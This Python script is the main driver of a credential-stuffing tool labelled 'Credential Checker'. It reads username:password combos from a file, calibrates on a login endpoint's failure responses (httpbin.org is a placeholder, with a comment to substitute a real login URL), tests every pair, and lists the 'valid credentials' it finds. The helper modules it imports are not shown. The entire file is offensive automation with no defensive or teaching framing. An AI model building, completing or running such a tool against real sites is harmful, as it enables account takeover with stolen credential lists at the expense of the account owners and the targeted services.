from input_engine import InputEngine
from login_detector import Calibrator, PatternAnalyzer, LoginDetector

def main():
    # Configuration
    combo_file = 'combo.txt'
    login_url = 'https://httpbin.org/post'  # Replace with real login URL
    username_field = 'username'
    password_field = 'password'
    
    print("=" * 60)
    print("CREDENTIAL CHECKER - INTEGRATED SYSTEM")
    print("=" * 60)
    
    # Phase 1: Setup InputEngine
    engine = InputEngine(combo_file)
    
    # Phase 4: Calibration
    calibrator = Calibrator(login_url, username_field, password_field)
    calibrator.run_calibration(num_attempts=5, delay=2)
    
    # Phase 4: Pattern Analysis
    analyzer = PatternAnalyzer(calibrator.calibration_responses)
    failure_pattern = analyzer.analyze()
    
    # Phase 4: Create Detector
    detector = LoginDetector(calibrator, analyzer)
    
    # Test credentials from file
    print("\n" + "=" * 60)
    print("TESTING CREDENTIALS FROM FILE")
    print("=" * 60)
    
    valid_credentials = []
    tested_count = 0
    
    for username, password in engine.load_credentials():
        tested_count += 1
        is_success, response, score, deviations = detector.test_credential(username, password)
        
        if is_success:
            detector.print_result(username, password, is_success, score, deviations)
            valid_credentials.append((username, password))
        else:
            print(f"   ❌ {tested_count}. {username}:{password}")
    
    # Summary
    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    print(f"Total tested: {tested_count}")
    print(f"Potential hits: {len(valid_credentials)}")
    
    if valid_credentials:
        print("\n✓ Valid credentials found:")
        for username, password in valid_credentials:
            print(f"  - {username}:{password}")

if __name__ == "__main__":
    main()